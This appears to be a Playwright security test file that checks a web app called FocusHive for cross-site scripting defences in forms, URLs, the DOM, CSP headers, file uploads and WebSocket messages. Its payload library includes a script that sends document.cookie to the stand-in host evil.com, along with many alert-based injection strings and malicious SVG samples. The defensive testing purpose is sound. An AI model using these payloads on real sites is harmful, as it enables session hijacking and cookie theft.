/**
 * XSS Prevention Security Tests (UOL-44.15)
 * 
 * Comprehensive Cross-Site Scripting (XSS) prevention testing for FocusHive
 * 
 * Test Categories:
 * 1. Reflected XSS Prevention
 * 2. Stored XSS Prevention  
 * 3. DOM-based XSS Prevention
 * 4. Content Security Policy (CSP) Enforcement
 * 5. Input Sanitization Validation
 * 6. Output Encoding Verification
 * 7. JavaScript Injection Prevention
 * 8. HTML Injection Prevention
 * 9. SVG XSS Prevention
 * 10. Event Handler XSS Prevention
 */

import { test, expect } from '@playwright/test';
import { Page } from '@playwright/test';

// XSS payload library for comprehensive testing
const XSS_PAYLOADS = {
  basic: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
  ],
  advanced: [
    '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
    '<iframe src="javascript:alert(document.cookie)"></iframe>',
    '<object data="javascript:alert(document.cookie)"></object>',
    '<embed src="javascript:alert(document.cookie)">',
    '<form><button formaction="javascript:alert(document.cookie)">Click</button></form>',
    '<input type="image" src=x onerror="alert(document.cookie)">',
  ],
  encoded: [
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
  ],
  eventHandlers: [
    '<div onmouseover="alert(\'XSS\')">Hover me</div>',
    '<input onfocus="alert(\'XSS\')" autofocus>',
    '<body onload="alert(\'XSS\')">',
    '<img src=x onerror="alert(\'XSS\')">',
    '<video controls onloadstart="alert(\'XSS\')"><source src=x></video>',
  ],
  domBased: [
    '#<script>alert("XSS")</script>',
    'javascript:alert(document.cookie)',
    'data:text/html,<script>alert("XSS")</script>',
    'vbscript:alert("XSS")',
  ],
  svg: [
    '<svg><script>alert("XSS")</script></svg>',
    '<svg onload="alert(\'XSS\')"></svg>',
    '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>',
    '<svg><animate onbegin="alert(\'XSS\')"></animate></svg>',
  ]
};

class XSSTestHelper {
  constructor(private page: Page) {}

  async testInputField(selector: string, payloads: string[]): Promise<boolean[]> {
    const results: boolean[] = [];
    
    for (const payload of payloads) {
      try {
        // Clear any existing value
        await this.page.fill(selector, '');
        
        // Inject payload
        await this.page.fill(selector, payload);
        
        // Submit or trigger the input
        await this.page.press(selector, 'Enter');
        
        // Wait for potential XSS execution
        await this.page.waitForTimeout(500);
        
        // Check if XSS executed by looking for alert dialogs
        const hasAlert = await this.page.evaluate(() => {
          return window.hasOwnProperty('___xss_executed___');
        });
        
        results.push(!hasAlert); // true if XSS was prevented
        
      } catch (error) {
        // If error occurred, likely XSS was prevented
        results.push(true);
      }
    }
    
    return results;
  }

  async setupXSSDetection(): Promise<void> {
    // Override alert function to detect XSS execution
    await this.page.addInitScript(() => {
      interface XSSTestWindow extends Window {
        ___xss_executed___?: boolean;
        ___xss_message___?: string;
      }
      
      const testWindow = window as XSSTestWindow;
      const originalAlert = window.alert;
      window.alert = function(message: string) {
        testWindow.___xss_executed___ = true;
        testWindow.___xss_message___ = message;
        console.error('XSS ALERT DETECTED:', message);
        return originalAlert.call(window, message);
      };
    });
  }

  async testUrlParameter(paramName: string, payload: string): Promise<boolean> {
    try {
      const url = `${this.page.url()}?${paramName}=${encodeURIComponent(payload)}`;
      await this.page.goto(url);
      
      await this.page.waitForTimeout(1000);
      
      const hasAlert = await this.page.evaluate(() => {
        return window.hasOwnProperty('___xss_executed___');
      });
      
      return !hasAlert; // true if XSS was prevented
    } catch (error) {
      return true; // Error likely means XSS was prevented
    }
  }

  async testDOMInjection(elementSelector: string, payload: string): Promise<boolean> {
    try {
      await this.page.evaluate((selector, html) => {
        const element = document.querySelector(selector);
        if (element) {
          element.innerHTML = html;
        }
      }, elementSelector, payload);
      
      await this.page.waitForTimeout(500);
      
      const hasAlert = await this.page.evaluate(() => {
        return window.hasOwnProperty('___xss_executed___');
      });
      
      return !hasAlert;
    } catch (error) {
      return true;
    }
  }

  async validateCSP(): Promise<boolean> {
    const response = await this.page.goto(this.page.url());
    const headers = response?.headers() || {};
    
    const csp = headers['content-security-policy'] || headers['content-security-policy-report-only'];
    
    if (!csp) {
      return false;
    }

    // Check for essential CSP directives
    const requiredDirectives = [
      'default-src',
      'script-src',
      'object-src',
      'style-src',
      'img-src'
    ];

    return requiredDirectives.every(directive => 
      csp.includes(directive)
    );
  }

  async clearXSSDetection(): Promise<void> {
    await this.page.evaluate(() => {
      interface XSSTestWindow extends Window {
        ___xss_executed___?: boolean;
        ___xss_message___?: string;
      }
      
      const testWindow = window as XSSTestWindow;
      delete testWindow.___xss_executed___;
      delete testWindow.___xss_message___;
    });
  }
}

test.describe('XSS Prevention Security Tests', () => {
  let xssHelper: XSSTestHelper;

  test.beforeEach(async ({ page }) => {
    xssHelper = new XSSTestHelper(page);
    await xssHelper.setupXSSDetection();
    await page.goto('/');
    
    // Login with test user
    await page.click('[data-testid="login-button"]');
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'TestPassword123!');
    await page.click('[data-testid="submit-login"]');
    await page.waitForURL('/dashboard');
  });

  test.afterEach(async ({ page }) => {
    await xssHelper.clearXSSDetection();
  });

  test.describe('Reflected XSS Prevention', () => {
    test('should prevent XSS in search parameters', async ({ page }) => {
      const searchPayloads = XSS_PAYLOADS.basic;
      
      for (const payload of searchPayloads) {
        const prevented = await xssHelper.testUrlParameter('search', payload);
        expect(prevented).toBe(true);
      }
    });

    test('should prevent XSS in URL fragments', async ({ page }) => {
      for (const payload of XSS_PAYLOADS.domBased) {
        const url = `${page.url()}${payload}`;
        await page.goto(url);
        
        await page.waitForTimeout(1000);
        
        const hasAlert = await page.evaluate(() => {
          return window.hasOwnProperty('___xss_executed___');
        });
        
        expect(hasAlert).toBe(false);
      }
    });

    test('should sanitize reflected input in error messages', async ({ page }) => {
      // Navigate to login page with malicious parameter
      await page.goto('/login?error=<script>alert("XSS")</script>');
      
      await page.waitForTimeout(1000);
      
      const hasAlert = await page.evaluate(() => {
        return window.hasOwnProperty('___xss_executed___');
      });
      
      expect(hasAlert).toBe(false);
    });
  });

  test.describe('Stored XSS Prevention', () => {
    test('should prevent XSS in hive names', async ({ page }) => {
      await page.goto('/create-hive');
      
      const results = await xssHelper.testInputField(
        '[data-testid="hive-name-input"]',
        XSS_PAYLOADS.basic
      );
      
      results.forEach(prevented => {
        expect(prevented).toBe(true);
      });
    });

    test('should prevent XSS in hive descriptions', async ({ page }) => {
      await page.goto('/create-hive');
      
      const results = await xssHelper.testInputField(
        '[data-testid="hive-description-input"]',
        XSS_PAYLOADS.advanced
      );
      
      results.forEach(prevented => {
        expect(prevented).toBe(true);
      });
    });

    test('should prevent XSS in chat messages', async ({ page }) => {
      // Navigate to a hive with chat
      await page.goto('/hive/test-hive');
      
      const results = await xssHelper.testInputField(
        '[data-testid="chat-message-input"]',
        XSS_PAYLOADS.basic.concat(XSS_PAYLOADS.eventHandlers)
      );
      
      results.forEach(prevented => {
        expect(prevented).toBe(true);
      });
    });

    test('should prevent XSS in user profile data', async ({ page }) => {
      await page.goto('/profile');
      
      // Test display name
      const nameResults = await xssHelper.testInputField(
        '[data-testid="display-name-input"]',
        XSS_PAYLOADS.basic
      );
      
      // Test bio
      const bioResults = await xssHelper.testInputField(
        '[data-testid="bio-input"]',
        XSS_PAYLOADS.eventHandlers
      );
      
      [...nameResults, ...bioResults].forEach(prevented => {
        expect(prevented).toBe(true);
      });
    });
  });

  test.describe('DOM-based XSS Prevention', () => {
    test('should prevent DOM manipulation XSS', async ({ page }) => {
      // Test DOM manipulation through various elements
      const testSelectors = [
        '[data-testid="user-content"]',
        '[data-testid="dynamic-content"]',
        '[data-testid="search-results"]'
      ];
      
      for (const selector of testSelectors) {
        if (await page.locator(selector).count() > 0) {
          for (const payload of XSS_PAYLOADS.basic) {
            const prevented = await xssHelper.testDOMInjection(selector, payload);
            expect(prevented).toBe(true);
          }
        }
      }
    });

    test('should prevent innerHTML XSS injection', async ({ page }) => {
      await page.evaluate(() => {
        const testDiv = document.createElement('div');
        testDiv.id = 'xss-test-div';
        document.body.appendChild(testDiv);
      });
      
      for (const payload of XSS_PAYLOADS.svg) {
        const prevented = await xssHelper.testDOMInjection('#xss-test-div', payload);
        expect(prevented).toBe(true);
      }
    });

    test('should prevent hash-based XSS', async ({ page }) => {
      for (const payload of XSS_PAYLOADS.domBased) {
        await page.goto(`${page.url()}#${encodeURIComponent(payload)}`);
        
        await page.waitForTimeout(1000);
        
        const hasAlert = await page.evaluate(() => {
          return window.hasOwnProperty('___xss_executed___');
        });
        
        expect(hasAlert).toBe(false);
      }
    });
  });

  test.describe('Content Security Policy (CSP) Enforcement', () => {
    test('should have proper CSP headers', async ({ page }) => {
      const hasValidCSP = await xssHelper.validateCSP();
      expect(hasValidCSP).toBe(true);
    });

    test('should block inline script execution', async ({ page }) => {
      // Try to inject inline script
      await page.addScriptTag({
        content: 'window.___inline_script_executed___ = true;'
      }).catch(() => {
        // Script should be blocked by CSP
      });
      
      const inlineExecuted = await page.evaluate(() => {
        return window.hasOwnProperty('___inline_script_executed___');
      });
      
      expect(inlineExecuted).toBe(false);
    });

    test('should block eval() usage', async ({ page }) => {
      const evalBlocked = await page.evaluate(() => {
        try {
          eval('window.___eval_executed___ = true;');
          return false;
        } catch (error) {
          return true; // eval was blocked
        }
      });
      
      expect(evalBlocked).toBe(true);
    });
  });

  test.describe('Input Sanitization and Output Encoding', () => {
    test('should encode HTML entities in user input', async ({ page }) => {
      await page.goto('/create-hive');
      
      const htmlPayload = '<div>Test &amp; Content</div>';
      await page.fill('[data-testid="hive-name-input"]', htmlPayload);
      await page.press('[data-testid="hive-name-input"]', 'Tab');
      
      // Check if HTML is properly encoded
      const displayedValue = await page.textContent('[data-testid="hive-name-display"]');
      expect(displayedValue).not.toContain('<div>');
      expect(displayedValue).toContain('&');
    });

    test('should sanitize markdown content', async ({ page }) => {
      await page.goto('/create-hive');
      
      const markdownPayload = '[Click me](javascript:alert("XSS"))';
      await page.fill('[data-testid="hive-description-input"]', markdownPayload);
      await page.press('[data-testid="hive-description-input"]', 'Tab');
      
      // Check if javascript: protocol is sanitized
      const linkHref = await page.getAttribute('a', 'href');
      expect(linkHref).not.toContain('javascript:');
    });

    test('should prevent attribute injection', async ({ page }) => {
      const attrPayload = 'normal-value" onmouseover="alert(\'XSS\')" x="';
      
      await page.fill('[data-testid="search-input"]', attrPayload);
      
      // Check if the attribute injection was prevented
      const hasOnMouseOver = await page.evaluate(() => {
        const searchInput = document.querySelector('[data-testid="search-input"]');
        return searchInput?.hasAttribute('onmouseover') || false;
      });
      
      expect(hasOnMouseOver).toBe(false);
    });
  });

  test.describe('File Upload XSS Prevention', () => {
    test('should validate file type for uploads', async ({ page }) => {
      await page.goto('/profile');
      
      // Try to upload an HTML file as image
      const fileInput = page.locator('[data-testid="avatar-upload"]');
      
      if (await fileInput.count() > 0) {
        const htmlContent = '<script>alert("XSS")</script>';
        
        await fileInput.setInputFiles({
          name: 'malicious.html',
          mimeType: 'text/html',
          buffer: Buffer.from(htmlContent)
        });
        
        // Check for error message
        const errorMessage = await page.textContent('[data-testid="upload-error"]');
        expect(errorMessage).toContain('Invalid file type');
      }
    });

    test('should scan uploaded files for XSS content', async ({ page }) => {
      await page.goto('/profile');
      
      const fileInput = page.locator('[data-testid="avatar-upload"]');
      
      if (await fileInput.count() > 0) {
        // Create a malicious SVG file
        const svgContent = `
          <svg xmlns="http://www.w3.org/2000/svg">
            <script>alert('XSS')</script>
          </svg>
        `;
        
        await fileInput.setInputFiles({
          name: 'malicious.svg',
          mimeType: 'image/svg+xml',
          buffer: Buffer.from(svgContent)
        });
        
        // Check if upload was rejected
        const uploadSuccess = await page.locator('[data-testid="upload-success"]').count();
        expect(uploadSuccess).toBe(0);
      }
    });
  });

  test.describe('JSONP and API XSS Prevention', () => {
    test('should prevent JSONP callback injection', async ({ page }) => {
      // Test JSONP callback parameter
      const maliciousCallback = 'alert("XSS");//';
      
      await page.route('**/api/**', route => {
        const url = route.request().url();
        if (url.includes('callback=')) {
          const callbackMatch = url.match(/callback=([^&]*)/);
          if (callbackMatch) {
            const callback = decodeURIComponent(callbackMatch[1]);
            // Should not contain suspicious characters
            expect(callback).not.toMatch(/[<>"'(){}[\]]/);
          }
        }
        route.continue();
      });
      
      await page.goto(`/api/data?callback=${encodeURIComponent(maliciousCallback)}`);
    });

    test('should validate API response content-type', async ({ page }) => {
      await page.route('**/api/**', route => {
        const headers = route.request().headers();
        const contentType = headers['content-type'];
        
        if (contentType) {
          expect(contentType).toMatch(/^application\/json/);
        }
        
        route.continue();
      });
      
      await page.goto('/dashboard');
    });
  });

  test.describe('Browser-specific XSS Prevention', () => {
    test('should prevent IE-specific XSS vectors', async ({ page }) => {
      // Test IE expression() CSS injection
      await page.addStyleTag({
        content: `
          .test {
            background: expression(alert('XSS'));
          }
        `
      }).catch(() => {
        // Style should be blocked
      });
      
      await page.waitForTimeout(1000);
      
      const hasAlert = await page.evaluate(() => {
        return window.hasOwnProperty('___xss_executed___');
      });
      
      expect(hasAlert).toBe(false);
    });

    test('should prevent data URI XSS', async ({ page }) => {
      const dataURI = 'data:text/html,<script>alert("XSS")</script>';
      
      try {
        await page.goto(dataURI);
        
        await page.waitForTimeout(1000);
        
        const hasAlert = await page.evaluate(() => {
          return window.hasOwnProperty('___xss_executed___');
        });
        
        expect(hasAlert).toBe(false);
      } catch (error) {
        // Navigation blocked - this is expected
        expect(error).toBeDefined();
      }
    });
  });

  test.describe('XSS Prevention in Real-time Features', () => {
    test('should prevent XSS in WebSocket messages', async ({ page }) => {
      await page.goto('/hive/test-hive');
      
      // Wait for WebSocket connection
      await page.waitForTimeout(2000);
      
      // Inject XSS payload through WebSocket
      await page.evaluate(() => {
        const ws = (window as any).webSocket;
        if (ws && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({
            type: 'chat_message',
            content: '<script>alert("XSS")</script>',
            userId: 'test-user'
          }));
        }
      });
      
      await page.waitForTimeout(1000);
      
      const hasAlert = await page.evaluate(() => {
        return window.hasOwnProperty('___xss_executed___');
      });
      
      expect(hasAlert).toBe(false);
    });

    test('should prevent XSS in presence updates', async ({ page }) => {
      await page.goto('/hive/test-hive');
      
      // Inject XSS through presence update
      await page.evaluate(() => {
        const ws = (window as any).webSocket;
        if (ws && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({
            type: 'presence_update',
            status: '<img src=x onerror=alert("XSS")>',
            userId: 'test-user'
          }));
        }
      });
      
      await page.waitForTimeout(1000);
      
      const hasAlert = await page.evaluate(() => {
        return window.hasOwnProperty('___xss_executed___');
      });
      
      expect(hasAlert).toBe(false);
    });
  });
});